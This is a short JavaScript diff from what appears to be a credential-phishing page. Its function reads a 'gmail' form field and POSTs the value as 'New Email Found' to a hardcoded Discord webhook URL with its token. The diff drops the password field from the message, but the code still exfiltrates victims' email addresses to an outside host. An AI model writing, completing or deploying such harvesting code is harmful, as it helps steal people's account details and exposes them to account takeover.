@@ -16,9 +16,8 @@ function message() {
 
 function message2() {
   let username = document.getElementById("gmail").value;
-  let password = document.getElementById("gmail2").value;
   const WebHook = "https://discord.com/api/webhooks/1179407562588827830/wLMzOQMVnWAnyAixOSaj8R-cpwC0QBJzm81NgG2i9DGy0PJw7OaGN2waqIQbIyclPaTN"
-  const contents = `New Email Found\nGmail: ${username}\nPassword:${password}`
+  const contents = `New Email Found\nGmail: ${username}`
   const request = new XMLHttpRequest();
   request.open("POST", WebHook);
   request.setRequestHeader('Content-type', 'application/json');
